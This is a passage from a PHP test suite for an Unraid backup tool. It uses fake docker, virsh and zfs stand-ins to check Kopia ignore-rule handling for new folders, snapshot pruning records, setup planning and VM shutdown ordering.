esac
exit 0
SH);
    file_put_contents("$tmp/bin/mountpoint", "#!/bin/bash\n[[ \"\${@: -1}\" == */user ]]\n");
    file_put_contents("$tmp/bin/mount", "#!/bin/bash\nmkdir -p \"\${@: -1}\"\n");
    file_put_contents("$tmp/bin/umount", "#!/bin/bash\nexit 0\n");
    file_put_contents("$tmp/bin/notify", "#!/bin/bash\nprintf '%s\\n' \"\$*\" >>\"\$FAKE/notify.log\"\n");
    foreach (glob("$tmp/bin/*") as $f) {
        chmod($f, 0755);
    }
    $sh = fn (string $script) => trim((string) shell_exec('bash -c ' . escapeshellarg("$env; source $lib >/dev/null 2>&1; $script") . ' 2>&1'));

    // --- the rules: which top-level folder is new
    file_put_contents("$tmp/s.ini", "[general]\ndumps_share = UnraidSecretaryOffice\nmount_root = $root\n[kopia]\nenabled = yes\nignore = _UnraidSecretaryOffice-trash*/\nignore = .DS_Store\n"
        . "[share \"appdata\"]\nmode = kopia\nkopia_ignore = /kopia/\nkopia_ignore = /cache*/\nkopia_ignore = /deep/cache/\nkopia_known = /a/\nkopia_known = /decided/\n"
        . "[share \"UnraidSecretaryOffice\"]\nmode = kopia\nkopia_known =\n[share \"docs\"]\nmode = kopia\n[share \"local\"]\nmode = snapshot\nkopia_known = /x/\n"
        . "[app \"nc\"]\nkopia = yes\nfolder = appdata/nc\n");
    $pre = "cfg_load $tmp/s.ini; cfg_validate >/dev/null; apply_settings; INV_METHOD[appdata]=snap; INV_LAYOUT[appdata]=single;"
         . ' INV_LOCS[appdata]="master|zfs|master/appdata|"$\'\\n\'; INV_METHOD[UnraidSecretaryOffice]=snap; INV_LAYOUT[UnraidSecretaryOffice]=single;';
    same('new: settings.ini with kopia_known is valid (an empty one too)', '0', $sh("$pre echo \${#CFG_ERRORS[@]}"));
    file_put_contents("$tmp/bad.ini", "[share \"x\"]\nmode = kopia\nkopia_known = a\nkopia_known = /a/b/\nkopia_known = /../\nkopia_known = /ok/\n");
    same('new: kopia_known must be /<folder>/', '3', $sh("cfg_load $tmp/bad.ini; cfg_validate >/dev/null; echo \${#CFG_ERRORS[@]}"));
    same('new: watched - kopia with kopia_known (also empty); without it, or only local: as before',
        'appdata UnraidSecretaryOffice', $sh("$pre for s in appdata UnraidSecretaryOffice docs local; do share_watched \$s && printf '%s ' \$s; done"));
    same('new: what is decided - known, own and global rules, an app\'s own part, the backup place\'s folder',
        'a=1 decided=1 kopia=1 cache2=1 deep=0 nc=1 _UnraidSecretaryOffice-trash-1=1 .DS_Store=1 b=0 ncx=0 backup:place=1 other:place=0',
        $sh("$pre new_decided_load appdata; for n in a decided kopia cache2 deep nc _UnraidSecretaryOffice-trash-1 .DS_Store b ncx; do new_decided appdata \"\$n\" && printf '%s=1 ' \$n || printf '%s=0 ' \$n; done;"
            . ' new_decided_load UnraidSecretaryOffice; new_decided UnraidSecretaryOffice backup && printf "backup:place=1 " || printf "backup:place=0 "; new_decided UnraidSecretaryOffice other && printf "other:place=1" || printf "other:place=0"'));
    same('new: fancier rules never count as leaving a folder out (it stays new - left out by the run itself)', '0 0 0 0 1 1',
        $sh('for r in "/@(b)/" "/b\\\\x/" "!/b/" "/b/c/" "b" "/b"; do rule_hides_top "$r" b && printf "1 " || printf "0 "; done'));
    same('new: a pattern character in a folder becomes ? in its rule', "/we ird?1??/\n/x/", $sh("$pre new_rules_for appdata 'we ird[1]*'; new_rules_for appdata x"));
    same('new: a split share gets a rule per base', "/master/x/\n/disk1/x/",
        $sh("$pre INV_LAYOUT[appdata]=split; INV_LOCS[appdata]=\"master|zfs|master/appdata|\"\$'\\n'\"disk1|btrfs|/mnt/disk1|appdata\"; new_rules_for appdata x"));
    foreach (['a', 'b', 'decided', 'kopia', 'nc', 'still', 'we ird[1]', '_UnraidSecretaryOffice-trash-1', '.zfs'] as $d) {
        @mkdir("$root/appdata/$d", 0700, true);
    }
    symlink("$root/appdata/a", "$root/appdata/link");
    touch("$root/appdata/file");
    same('new: the folders at the top - no links, files or .zfs', "_UnraidSecretaryOffice-trash-1\na\nb\ndecided\nkopia\nnc\nstill\nwe ird[1]",
        $sh("top_dirs $root/appdata | LC_ALL=C sort"));
    same('new: a collection (kopia_known = *) is not watched - every folder goes', '0|',
        $sh("$pre CFG[share|appdata|kopia_known]='*'; cfg_validate >/dev/null; printf '%s|' \${#CFG_ERRORS[@]}; share_watched appdata && echo watched"));
    same('new: a folder\'s size only where cheap - a ZFS dataset of its own', '42|',
        $sh("$pre INV_BASE_PATH[master]=/p; INV_CHILDREN[appdata]=\$'master|master/appdata/b|/p/appdata/b\\n'; ZDS_REF[master/appdata/b]=42; printf '%s|%s' \"\$(new_folder_bytes appdata b)\" \"\$(new_folder_bytes appdata c)\""));
    same('new: the wanted policy of a share includes the rules for its new folders', "/cache*/\n/deep/cache/\n/kopia/\n/nc/\n/still/",
        $sh("$pre NEW_RULES[appdata]=/still/; kopia_want_ignores share appdata"));

    // --- the run, right before Kopia: the snapshot's folders, the policy, the state, drift, one notification
    file_put_contents("$tmp/data/unraid-backup/state/new-local.json", json_encode(['interface' => 1, 'folders' => [
        ['share' => 'appdata', 'folder' => 'still', 'bytes' => null, 'first_seen' => 1000, 'rules' => ['/still/']],
        ['share' => 'appdata', 'folder' => 'decided', 'bytes' => null, 'first_seen' => 1000, 'rules' => ['/decided/']],
        ['share' => 'appdata', 'folder' => 'vanished', 'bytes' => 7, 'first_seen' => 1000, 'rules' => ['/vanished/']],
        ['share' => 'docs', 'folder' => 'x', 'first_seen' => 1000, 'rules' => ['/x/']],
        ['share' => "odd\nshare", 'folder' => 'x', 'first_seen' => 1, 'rules' => ['/x/']]]]));
    $kp = json_encode([['target' => ['path' => '/uso/appdata', 'userName' => 'root', 'host' => 'kopia'],
        'policy' => [], 'files' => ['ignore' => ['/kopia/', '/still/', '/decided/', '/vanished/']]]]);
    file_put_contents("$tmp/kp.json", $kp);
    $run = "$pre ub_data_dirs; TS=20261007-0100; LOG_FILE=$tmp/run.log; KOPIA_CONTAINER=kopia; KOPIA_USER=root; KOPIA_HOST=kopia; KOPIA_ID=root@kopia;"
         . " KP_JSON=\"\$(cat $tmp/kp.json)\"; KM_SRC=($root); KM_DST=(/uso); KM_RW=(false); KM_PROP=(rslave); PLAN_KOPIA=(appdata UnraidSecretaryOffice docs);"
         . ' declare -A SHARE_MOUNTED=([appdata]=single); ST_ACTIVE=yes; ST_MODE=backup; ST_STARTED=1;';
    same('run: before Kopia - what the last run left out and is still undecided (decided ones go, unwatched shares go)',
        "appdata/still appdata/vanished |/still/\n/vanished/|new_waiting new_waiting known_missing",
        $sh("$run drift_check_new_local; for l in \"\${NEW_LIST[@]}\"; do IFS=\$'\\x1f' read -r s n _ <<<\"\$l\"; printf '%s/%s ' \$s \$n; done;"
            . ' printf "|%s|" "${NEW_RULES[appdata]%$\'\\n\'}"; for c in "${DRIFT_CODE[@]}"; do printf "%s " "${c%%$\'\\x1f\'*}"; done'));
    $out = $sh("$run drift_check_new_local; new_local_run; echo \"skip=\${SKIP_KOPIA[appdata]:-}\"");
    check('run: the share\'s policy - the new folder in, the decided and the vanished one out, only those',
        str_contains((string) @file_get_contents("$tmp/fake/docker.log"), 'exec -u 0 kopia kopia --no-progress policy set root@kopia:/uso/appdata --add-ignore /b/ --add-ignore /we ird?1?/ --remove-ignore /decided/ --remove-ignore /vanished/'),
        (string) @file_get_contents("$tmp/fake/docker.log") . " | $out");
    $st = json_decode((string) @file_get_contents("$tmp/data/unraid-backup/state/new-local.json"), true);
    same('run: state/new-local.json - the new folders, the earlier first sight kept, their rules',
        [['appdata', 'b', ['/b/']], ['appdata', 'still', ['/still/']], ['appdata', 'we ird[1]', ['/we ird?1?/']]],
        array_map(fn ($f) => [$f['share'], $f['folder'], $f['rules']], $st['folders'] ?? []));
    same('run: first seen - the earlier one kept, a new one now', [true, 1000], [($st['folders'][0]['first_seen'] ?? 0) > 1000, $st['folders'][1]['first_seen'] ?? null]);
    $notes = (string) @file_get_contents("$tmp/fake/notify.log");
    check('run: one notification (normal) for the folders seen for the first time', substr_count($notes, "\n") === 1 && str_contains($notes, '2 new folders stay local')
        && str_contains($notes, 'appdata/b, appdata/we ird[1]') && str_contains($notes, '-i normal') && !str_contains($notes, 'still'), $notes);
    $dj = json_decode((string) @file_get_contents("$tmp/data/unraid-backup/state/drift.json"), true);
    same('run: drift.json - a note per new folder (info, code new_waiting)', [['info', 'known_missing', 'docs'], ['info', 'new_waiting', 'appdata/b'], ['info', 'new_waiting', 'appdata/still'], ['info', 'new_waiting', 'appdata/we ird[1]']],
        array_map(fn ($i) => [$i['level'], $i['code'], $i['value']], $dj['items'] ?? []));
    $sj = json_decode((string) @file_get_contents("$tmp/data/unraid-backup/state/status.json"), true);
    same('run: status.json new_local', ['b', 'still', 'we ird[1]'], array_column($sj['new_local'] ?? [], 'folder'));
    check('run: nothing skipped', str_contains($out, 'skip=') && !str_contains($out, 'skip=its'), $out);
    // the next night: nothing new - no notification, no policy change
    @unlink("$tmp/fake/docker.log");
    file_put_contents("$tmp/kp.json", json_encode([['target' => ['path' => '/uso/appdata', 'userName' => 'root', 'host' => 'kopia'],
        'files' => ['ignore' => ['/kopia/', '/still/', '/b/', '/we ird?1?/']]]]));
    $sh("$run drift_check_new_local; new_local_run");
    same('run: the next night - no second notification, no policy change', [1, ''], [substr_count((string) @file_get_contents("$tmp/fake/notify.log"), "\n"), trim((string) @file_get_contents("$tmp/fake/docker.log"))]);
    // decided meanwhile: b goes to Kopia (known), the rule goes; Kopia refusing a rule skips the share
    $sh("sed -i 's|^kopia_known = /a/|kopia_known = /a/\\nkopia_known = /b/|' $tmp/s.ini");
    $sh("$run drift_check_new_local; new_local_run");
    check('run: a folder decided for Kopia - its rule goes', str_contains((string) @file_get_contents("$tmp/fake/docker.log"), '--remove-ignore /b/'), (string) @file_get_contents("$tmp/fake/docker.log"));
    @mkdir("$root/appdata/c", 0700);
    same('run: Kopia refuses the rule - the share is skipped, never uploaded unasked', 'its new folders could not be left out of its policy',
        $sh("FAKE_POLICY_FAIL=1; export FAKE_POLICY_FAIL; $run drift_check_new_local; new_local_run >/dev/null; printf '%s' \"\${SKIP_KOPIA[appdata]:-}\""));
    same('run: a share not mounted this run keeps its notes', 'appdata/c appdata/still appdata/we ird[1]',
        $sh("$run SHARE_MOUNTED=(); drift_check_new_local; new_local_run >/dev/null; for l in \"\${NEW_LIST[@]}\"; do IFS=\$'\\x1f' read -r s n _ <<<\"\$l\"; printf '%s/%s ' \"\$s\" \"\$n\"; done"));
    exec('rm -rf ' . escapeshellarg("$root/appdata"));

    // --- what the retention removed: state/pruned.json, run by run (the last runs within the days, capped)
    $data0 = "$tmp/data/unraid-backup";
    $old = ['interface' => 1, 'runs' => [['run' => 'ancient', 'time' => 1000, 'zfs' => ['p/a@uso-backup-20200101-0100'], 'btrfs' => []], 'odd']];
    for ($i = 0; $i < 4; $i++) {
        $old['runs'][] = ['run' => "r$i", 'time' => 2000000000 - 3600 * (10 - $i), 'zfs' => [], 'btrfs' => []];
    }
    file_put_contents("$data0/state/pruned.json", json_encode($old));
    $sh('UB_PRUNED_RUNS=3; UB_PRUNED_CAP=2; TS=20330518-0333; PRUNED_ZFS=(p/a@uso-backup-20330501-0100 p/a@uso-backup-20330502-0100 p/b@uso-backup-20330501-0100);'
        . ' PRUNED_BTRFS=(/mnt/disk4/.btrfs-snap/20330501-0100); pruned_write 2000000000');
    $pr = json_decode((string) @file_get_contents("$data0/state/pruned.json"), true);
    same('pruned: the newest runs within the days, this one last (an old and an odd entry go)', ['r2', 'r3', '20330518-0333'], array_column($pr['runs'] ?? [], 'run'));
    same('pruned: this run\'s snapshots, a list capped with the rest counted', [['p/a@uso-backup-20330501-0100', 'p/a@uso-backup-20330502-0100'], 1, ['/mnt/disk4/.btrfs-snap/20330501-0100'], 2000000000],
        [$pr['runs'][2]['zfs'] ?? null, $pr['runs'][2]['zfs_more'] ?? null, $pr['runs'][2]['btrfs'] ?? null, $pr['updated'] ?? null]);
    file_put_contents("$data0/state/pruned.json", 'not json');
    $sh('TS=20330519-0100; pruned_write 2000086400');
    $pr = json_decode((string) @file_get_contents("$data0/state/pruned.json"), true);
    same('pruned: a broken file starts anew; a run that removed nothing has empty lists', [['20330519-0100', [], []]],
        array_map(fn ($r) => [$r['run'], $r['zfs'], $r['btrfs']], $pr['runs'] ?? []));

    // --- setup.sh on a fixture server: --plan and --apply
    $pool = "$mnt/master";
    foreach (["$pool/media/a", "$pool/media/b", "$pool/media/c", "$pool/media/d", "$pool/media/e", "$pool/media/f", "$pool/media/g"] as $d) {
        @mkdir($d, 0700, true);
    }
    foreach (["$mnt/user", "$pool/appdata/c1", "$pool/appdata/bitcoin2", "$pool/appdata/kopia", "$pool/appdata/gone", "$pool/appdata/bigds", "$pool/appdata/_UnraidSecretaryOffice-trash",
              "$pool/UnraidSecretaryOffice/backup", "$pool/docs", "$mnt/ripley/sleepy/old"] as $d) {
        @mkdir($d, 0700, true);
    }
    foreach (['appdata', 'UnraidSecretaryOffice', 'docs', 'sleepy', 'media'] as $n) {
        touch("$tmp/boot/config/shares/$n.cfg");
    }
    file_put_contents("$tmp/fake/mounts", "master $pool zfs rw 0 0\nmaster/appdata $pool/appdata zfs rw 0 0\nmaster/appdata/bigds $pool/appdata/bigds zfs rw 0 0\n"
        . "master/UnraidSecretaryOffice $pool/UnraidSecretaryOffice zfs rw 0 0\nmaster/docs $pool/docs zfs rw 0 0\nmaster/media $pool/media zfs rw 0 0\nripley $mnt/ripley zfs rw 0 0\nripley/sleepy $mnt/ripley/sleepy zfs rw 0 0\n"
        . "shfs $mnt/user fuse.shfs rw 0 0\n");
    $z = fn ($n, $mp, $ref) => "$n\t$mp\ton\t" . crc32($n) . "\t$ref\t-\n";
    file_put_contents("$tmp/fake/zfs.txt", $z('master', $pool, 1) . $z('master/appdata', "$pool/appdata", 5000) . $z('master/appdata/bigds', "$pool/appdata/bigds", 123456789)
        . $z('master/UnraidSecretaryOffice', "$pool/UnraidSecretaryOffice", 10) . $z('master/docs', "$pool/docs", 10) . $z('master/media', "$pool/media", 10) . $z('ripley', "$mnt/ripley", 1) . $z('ripley/sleepy', "$mnt/ripley/sleepy", 10));
    file_put_contents("$tmp/fake/disks.ini", "[\"master\"]\nname=\"master\"\nspundown=\"0\"\n[\"ripley\"]\nname=\"ripley\"\nspundown=\"1\"\n");
    file_put_contents("$tmp/fake/repo.json", json_encode(['configFile' => '/config/repository.config', 'storage' => ['type' => 'filesystem'], 'clientOptions' => ['username' => 'root', 'hostname' => 'kopia']]));
    file_put_contents("$tmp/fake/ids", "id1\nid2\nid3\n");
    $ct = fn ($name, $img, $binds) => ['Name' => "/$name", 'Id' => "id-$name", 'Config' => ['Image' => $img, 'Env' => [], 'Labels' => new stdClass()],
        'State' => ['Running' => true], 'HostConfig' => ['NetworkMode' => 'bridge'],
        'Mounts' => array_map(fn ($b) => ['Type' => 'bind', 'Source' => $b[0], 'Destination' => $b[1], 'RW' => true], $binds)];
    file_put_contents("$tmp/fake/inspect.json", json_encode([
        $ct('kopia', 'imagegenius/kopia', [["$mnt/user/appdata/kopia", '/config'], [$root, '/uso']]),
        $ct('c1', 'nginx', [["$mnt/user/appdata/c1", '/config']]),
        $ct('btc', 'bitcoind', [["$mnt/user/appdata/bitcoin2", '/data']])]));
    $data = "$tmp/data/unraid-backup";
    exec('rm -rf ' . escapeshellarg("$data/state") . ' ' . escapeshellarg("$tmp/fake/docker.log") . ' ' . escapeshellarg("$tmp/fake/notify.log"));
    file_put_contents("$data/settings.ini", "[general]\nserver = Test\nmount_root = $root\nview_root = $mnt/addons/UnraidSecretaryOffice/btrfs-snap\nsnap_prefix = uso-backup-\n"
        . "dumps_share = UnraidSecretaryOffice\n[docker]\nstop = all\nknown = kopia\nknown = c1\n[flash]\nmode = off\n[kopia]\nenabled = yes\ncontainer = kopia\nidentity = root@kopia\n"
        . "ignore = _UnraidSecretaryOffice-trash*/\n[share \"appdata\"]\nmode = kopia\nkopia_ignore = /kopia/\n[share \"UnraidSecretaryOffice\"]\nmode = kopia\n"
        . "[share \"docs\"]\nmode = kopia\n[share \"sleepy\"]\nmode = kopia\n[share \"media\"]\nmode = kopia\n[vm \"oldvm\"]\nmode = snapshot\nprepare = pause\n");
    $setup = fn (string $args) => (string) shell_exec('bash -c ' . escapeshellarg("$env UB_SIZE_TIMEOUT=0 UB_EXPLAIN=0 UB_KNOWN_MAX=6; bash " . escapeshellarg(OFFICE_DIR . '/backup/setup.sh') . " $args </dev/null") . ' 2>&1');
    $out = $setup('--plan');
    $plan = json_decode((string) @file_get_contents("$data/state/setup-plan.json"), true) ?: [];
    $P = $plan['P'] ?? [];
    same('setup plan: the first record - every folder that is there and not left out (2.20 settings: nothing recorded yet)',
        [['/bigds/', '/bitcoin2/', '/c1/', '/gone/'], ['/backup/'], []],
        [$P['share|appdata|kopia_known'] ?? null, $P['share|UnraidSecretaryOffice|kopia_known'] ?? null, $P['share|docs|kopia_known'] ?? null], $out);
    check('setup plan: a share with a sleeping disk gets its first record later (nothing woken)', !array_key_exists('share|sleepy|kopia_known', $P), json_encode($P));
    same('setup plan: very many folders at a share\'s top - a collection, every folder goes (*)', ['*'], $P['share|media|kopia_known'] ?? null);
    $cts = array_column($plan['containers'] ?? [], null, 'name');
    same('setup plan: a new container keeps running (code new), a known one as before', [['new', false], [true, true]],
        [[$cts['btc']['why'] ?? null, $cts['btc']['stop'] ?? null], [$cts['c1']['previous'] ?? null, $cts['c1']['stop'] ?? null]]);
    check('setup plan: the new container in no_stop', in_array('btc', $P['docker|no_stop'] ?? [], true), json_encode($P['docker|no_stop'] ?? null));
    $vms = array_column($plan['vms'] ?? [], null, 'name');
    same('setup plan: a new VM is not held (prepare none), a known one as before', ['none', 'pause', true, false],
        [$P['vm|newvm|prepare'] ?? null, $P['vm|oldvm|prepare'] ?? null, $vms['oldvm']['previous'] ?? null, $vms['newvm']['previous'] ?? null]);
    same('setup plan: nothing waiting at the first record', [], array_merge(...array_map(fn ($s) => $s['waiting'] ?? ['?'], $plan['shares'] ?? [])));
    // apply what the plan says (the office sends its draft: every key of P)
    file_put_contents("$tmp/dec.json", json_encode($P + ['_retire_sources' => 'no']));
    $out = $setup("--apply=$tmp/dec.json");
    $ini = (string) @file_get_contents("$data/settings.ini");
    check('setup apply: kopia_known written, an empty one as "kopia_known =", none for the sleeping share',
        str_contains($ini, "kopia_known = /bigds/\nkopia_known = /bitcoin2/\nkopia_known = /c1/\nkopia_known = /gone/\n") && str_contains($ini, "[share \"docs\"]\nmode = kopia\nkopia_known =\n")
        && !preg_match('/\[share "sleepy"\][^\[]*kopia_known/', $ini) && str_contains($ini, "known = btc") && str_contains($ini, "[share \"media\"]\nmode = kopia\nkopia_known = *\n"), $ini . $out);
    same('setup apply: the settings written load without errors', '0', $sh("cfg_load $data/settings.ini; cfg_validate >/dev/null; echo \${#CFG_ERRORS[@]}"));
    // a folder comes: the plan lists it as waiting, Apply leaves it out of Kopia until decided
    @mkdir("$pool/appdata/zz-new", 0700);
    rmdir("$pool/appdata/gone");
    $setup('--plan');
    $plan = json_decode((string) @file_get_contents("$data/state/setup-plan.json"), true) ?: [];
    $sh2 = array_column($plan['shares'] ?? [], null, 'name');
    same('setup plan: a new folder waits, the record stays (a gone folder drops out)',
        [[['dir' => 'zz-new', 'bytes' => null, 'first_seen' => null]], ['/bigds/', '/bitcoin2/', '/c1/']],
        [$sh2['appdata']['waiting'] ?? null, $plan['P']['share|appdata|kopia_known'] ?? null]);
    @unlink("$tmp/fake/docker.log");
    file_put_contents("$tmp/dec.json", json_encode($plan['P'] + ['_retire_sources' => 'no']));
    $out = $setup("--apply=$tmp/dec.json");
    $log = (string) @file_get_contents("$tmp/fake/docker.log");
    check('setup apply: undecided - Kopia\'s policy leaves the new folder out', (bool) preg_match('#policy set root@kopia:/uso/appdata .*--add-ignore /zz-new/#', $log), $log . $out);
    check('setup apply: undecided - not recorded', !str_contains((string) @file_get_contents("$data/settings.ini"), 'kopia_known = /zz-new/'));
    // decided: local + Kopia
    @unlink("$tmp/fake/docker.log");
    file_put_contents("$tmp/fake/policies.json", json_encode([['target' => ['path' => '/uso/appdata', 'userName' => 'root', 'host' => 'kopia'], 'files' => ['ignore' => ['/kopia/', '/zz-new/']]]]));
    $dec = $plan['P'];
    $dec['share|appdata|kopia_known'][] = '/zz-new/';
    file_put_contents("$tmp/dec.json", json_encode($dec + ['_retire_sources' => 'no']));
    $setup("--apply=$tmp/dec.json");
    $log = (string) @file_get_contents("$tmp/fake/docker.log");
    check('setup apply: decided for Kopia - recorded, and its rule goes', str_contains((string) @file_get_contents("$data/settings.ini"), 'kopia_known = /zz-new/')
        && (bool) preg_match('#policy set root@kopia:/uso/appdata .*--remove-ignore /zz-new/#', $log), $log);
    // a container that came after the plan stays new at Apply
    file_put_contents("$tmp/fake/ids", "id1\nid2\nid3\nid4\n");
    $all = json_decode((string) file_get_contents("$tmp/fake/inspect.json"));
    $all[] = $ct('late', 'redis', []);
    file_put_contents("$tmp/fake/inspect.json", json_encode($all));
    $setup("--apply=$tmp/dec.json");
    $ini = (string) @file_get_contents("$data/settings.ini");
    check('setup apply: a container that came after the plan stays new (keeps running, not known)', !str_contains($ini, 'known = late') && str_contains($ini, 'no_stop = late'), $ini);
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * Engine 2.22: VMs with prepare = shutdown go down before anything stops. backup.sh runs on a fixture
 * server — stand-ins for docker, zfs, zpool, btrfs, virsh, mount and notify on PATH, its data, the
 * shares and the backup place in a temporary folder (no Kopia, no notification, nothing real is
 * stopped, snapshotted or started): the order of what it did (one events file the stand-ins write),
 * downtime_s, status.json vms and state/vms — a VM that shuts down, one that ignores the request
 * (paused right before the snapshot), one that goes off late (while the apps stopped: started again,
 * not paused), a VM paused as before; a run without such VMs; a run stopped while a VM goes down (it
 * waits for it and starts it again); a run killed then (the next start starts it).
 */
function testBackupVmOrder(): void
{
    if (posix_getuid() !== 0) {
        check('vm order: backup.sh runs as root only — not run here', true);
        return;
    }
    $tmp = sys_get_temp_dir() . '/office-tests-vmorder-' . getmypid();
    exec('rm -rf ' . escapeshellarg($tmp));
    $mnt = "$tmp/mnt";
    $pool = "$mnt/master";
    $fake = "$tmp/fake";
    $data = "$tmp/data/unraid-backup";
    $vms = ['vmshut', 'vmdeaf', 'vmlate', 'vmpause', 'vmslow'];
    foreach (["$tmp/bin", "$fake/vm", "$fake/ct", "$data/state", "$tmp/boot/config/shares", "$mnt/user/UnraidSecretaryOffice", "$pool/appdata/c1",
              "$pool/UnraidSecretaryOffice/backup", "$tmp/stage"] as $d) {
        @mkdir($d, 0700, true);
    }
    foreach ($vms as $v) {
        @mkdir("$pool/domains/$v", 0700, true);
        touch("$pool/domains/$v/vdisk1.img");
    }
    foreach (['appdata', 'domains', 'UnraidSecretaryOffice'] as $n) {
        touch("$tmp/boot/config/shares/$n.cfg");
    }
    file_put_contents("$fake/mounts", "master $pool zfs rw 0 0\nmaster/appdata $pool/appdata zfs rw 0 0\nmaster/domains $pool/domains zfs rw 0 0\n"
        . "master/UnraidSecretaryOffice $pool/UnraidSecretaryOffice zfs rw 0 0\nshfs $mnt/user fuse.shfs rw 0 0\n");
    $z = fn ($n, $mp) => "$n\t$mp\ton\t" . crc32($n) . "\t1000\t-\n";
    file_put_contents("$fake/zfs.txt", $z('master', $pool) . $z('master/appdata', "$pool/appdata") . $z('master/domains', "$pool/domains")
        . $z('master/UnraidSecretaryOffice', "$pool/UnraidSecretaryOffice"));
    file_put_contents("$fake/inspect.json", json_encode([['Name' => '/c1', 'Id' => 'id1', 'Config' => ['Image' => 'nginx', 'Env' => [], 'Labels' => new stdClass()],
        'State' => ['Running' => true], 'HostConfig' => ['NetworkMode' => 'bridge'],
        'Mounts' => [['Type' => 'bind', 'Source' => "$mnt/user/appdata/c1", 'Destination' => '/config', 'RW' => true]]]]));
    // the stand-ins note what changes something, with the second it happened: "<time> <what>"
    file_put_contents("$tmp/bin/docker", <<<'SH'
#!/bin/bash
ev() { echo "$(date +%s) $*" >>"$FAKE/events"; }
st() { cat "$FAKE/ct/$1" 2>/dev/null || echo running; }
case "$1" in
  info|version) exit 0 ;;
  ps) [[ "$*" == *q* ]] && echo id1 || printf 'c1\tnginx\tUp\n'; exit 0 ;;
  inspect)
    shift
    if [[ "$1" == -f ]]; then
      case "$2" in
        *Health*) [[ "$(st "$3")" == running ]] && echo "true " || echo "false " ;;
        *State.Running*) [[ "$(st "$3")" == running ]] && echo true || echo false ;;
      esac
      exit 0
    fi
    [[ "$1" == --format ]] && { echo "/c1  nginx  sha256:1"; exit 0; }
    cat "$FAKE/inspect.json"; exit 0 ;;
  stop) shift; while [[ "$1" == -* ]]; do shift 2; done
        for c in "$@"; do echo stopped >"$FAKE/ct/$c"; ev "docker stop $c"; done; exit 0 ;;
  start) shift; for c in "$@"; do echo running >"$FAKE/ct/$c"; ev "docker start $c"; done; exit 0 ;;
esac
exit 1
SH);
    // VMs: how each answers a shutdown request ($FAKE/vm/<name>.how): obey (off at once), deaf (never),
    // late (off once the apps were stopped), slow (off 3 s after the request)
    file_put_contents("$tmp/bin/virsh", <<<'SH'
#!/bin/bash
ev() { echo "$(date +%s) $*" >>"$FAKE/events"; }
V="$FAKE/vm"; n="${2:-}"
[[ "$2" == --* ]] && n="${@: -1}"
state() {
  local s; s="$(cat "$V/$n.state" 2>/dev/null || echo running)"
  if [[ "$s" == running && -e "$V/$n.asked" ]]; then
    case "$(cat "$V/$n.how" 2>/dev/null)" in
      late) grep -q 'docker stop' "$FAKE/events" 2>/dev/null && s="shut off" ;;
      slow) (( $(date +%s) - $(cat "$V/$n.asked") >= 3 )) && s="shut off" ;;
    esac
    [[ "$s" == "shut off" ]] && echo "$s" >"$V/$n.state"
  fi
  echo "$s"
}
case "$1" in
  list) cat "$FAKE/vms"; exit 0 ;;
  domstate) state; exit 0 ;;
  dominfo) echo "Autostart:      disable"; exit 0 ;;
  dumpxml) echo "<domain><name>$n</name><uuid>uuid-$n</uuid></domain>"; exit 0 ;;
  domblklist) printf 'Type Device Target Source\n----\nfile disk vdisk1 %s\n' "$MNT/user/domains/$n/vdisk1.img"; exit 0 ;;
  qemu-agent-command|domfsfreeze) exit 1 ;;
  shutdown) ev "virsh shutdown $n"; [[ -e "$V/$n.asked" ]] || date +%s >"$V/$n.asked"
            [[ "$(cat "$V/$n.how" 2>/dev/null)" == obey ]] && echo "shut off" >"$V/$n.state"; exit 0 ;;
  suspend) [[ "$(state)" == running ]] || exit 1; echo paused >"$V/$n.state"; ev "virsh suspend $n"; exit 0 ;;
  resume) echo running >"$V/$n.state"; ev "virsh resume $n"; exit 0 ;;
  start) [[ "$(state)" == "shut off" ]] || exit 1; echo running >"$V/$n.state"; rm -f "$V/$n.asked"; ev "virsh start $n"; exit 0 ;;
esac
exit 0
SH);
    file_put_contents("$tmp/bin/zfs", "#!/bin/bash\ncase \"\$*\" in *'-t filesystem'*) cat \"\$FAKE/zfs.txt\" ;; snapshot*) echo \"\$(date +%s) zfs \$*\" >>\"\$FAKE/events\" ;; esac\nexit 0\n");
    foreach (['zpool', 'btrfs', 'umount'] as $b) {
        file_put_contents("$tmp/bin/$b", "#!/bin/bash\nexit 0\n");
    }
    file_put_contents("$tmp/bin/mount", "#!/bin/bash\nexit 1\n");
    file_put_contents("$tmp/bin/mountpoint", "#!/bin/bash\n[[ \"\${@: -1}\" == */user ]]\n");
    file_put_contents("$tmp/bin/notify", "#!/bin/bash\necho \"\$*\" >>\"\$FAKE/notify.log\"\n");
    foreach (glob("$tmp/bin/*") as $f) {
        chmod($f, 0755);
    }
    $env = "export PATH=$tmp/bin:\$PATH UB_DATA=$data UB_MNT=$mnt UB_BOOT=$tmp/boot UB_SHARES_CFG=$tmp/boot/config/shares UB_STAGE=$tmp/stage"
         . " UB_DISKS_INI=$fake/disks.ini UB_MOUNTS_FILE=$fake/mounts UB_NOTIFY_BIN=$tmp/bin/notify UB_NO_NOTIFY=1 FAKE=$fake MNT=$mnt"
         . ' UB_VM_SHUTDOWN_TIMEOUT=4 UB_VM_SHUTDOWN_RETRY=2';
    $settings = function (array $prep) use ($mnt, $data): void {
        $ini = "[general]\nserver = Test\nmount_root = $mnt/addons/UnraidSecretaryOffice/snapshots\nview_root = $mnt/addons/UnraidSecretaryOffice/btrfs-snap\n"
             . "snap_prefix = uso-backup-\ndumps_share = UnraidSecretaryOffice\nmin_free_gb = 0\n[docker]\nstop = all\nknown = c1\n[flash]\nmode = off\n"
             . "[libvirt]\nmode = off\n[kopia]\nenabled = no\n[share \"appdata\"]\nmode = snapshot\n[share \"domains\"]\nmode = snapshot\n"
             . "[share \"UnraidSecretaryOffice\"]\nmode = snapshot\n";
        foreach ($prep as $vm => $p) {
            $ini .= "[vm \"$vm\"]\nmode = snapshot\nprepare = $p\n";
        }
        file_put_contents("$data/settings.ini", $ini);
    };
    // a fresh night: every VM and the container running, nothing noted
    $night = function (array $how) use ($fake, $data, $vms): void {
        // the logs too: a run in the same minute writes to the same run-<minute>.log
        exec('rm -rf ' . escapeshellarg("$fake/vm") . ' ' . escapeshellarg("$fake/ct") . ' ' . escapeshellarg("$fake/events") . ' ' . escapeshellarg("$data/logs"));
        @mkdir("$fake/vm", 0700, true);
        @mkdir("$fake/ct", 0700, true);
        foreach ($how as $vm => $h) {
            file_put_contents("$fake/vm/$vm.how", $h);
        }
        file_put_contents("$fake/vms", implode("\n", array_keys($how)) . "\n");
        @unlink("$data/state/status.json");
    };
    $events = function () use ($fake): array {
        $out = [];
        foreach (file("$fake/events", FILE_IGNORE_NEW_LINES) ?: [] as $l) {
